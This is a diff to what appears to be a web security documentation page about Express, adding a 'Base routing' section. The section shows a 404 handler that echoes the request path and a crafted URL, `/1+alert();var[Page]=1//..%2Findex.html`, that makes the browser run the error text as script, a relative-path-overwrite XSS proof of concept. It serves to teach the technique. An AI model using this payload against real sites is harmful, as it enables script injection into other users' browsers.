@@ -8,7 +8,7 @@ draft: false
 images: []
 menu:
   docs:
-    parent: "topics"
+    parent: "express"
 weight: 620
 toc: true
 ---
@@ -203,3 +203,52 @@ This query string is equals to:
 }
 ```
 {{< /details >}}
+
+## Base routing
+
+File: `main.js`
+
+```js
+const express = require('express')
+
+const port = 3000;
+const app = express()
+
+app.use(
+	express.static('static', {
+		index: 'index.html'
+	})
+)
+
+app.use((req, res) => {
+	res.type('text').send(`Page ${req.path} not found`)
+})
+
+app.listen(port, async () => {
+	console.log(`Listening on http://0.0.0.0:${port}`)
+})
+```
+
+File: `static/index.html`
+
+```html
+<html>
+	<head>
+		<title>Home</title>
+	</head>
+	</body>
+		<h3>Home</h3>
+		<script src="index.js"></script>
+	</body>
+</html>
+```
+
+If you visit `/example/..%2Findex.html`, your browser will load the JS script `index.js` at `/example/index.js`.
+
+Similarly, if you visit `/1+alert();var[Page]=1//..%2Findex.html`, the browser will load the JS script at `/1+alert();var[Page]=1//index.js`. Consequently, the content of the script `index.js` will be:
+
+```js
+Page /1+alert();var[Page]=1//index.js not found
+```
+
+An alert will be then executed.
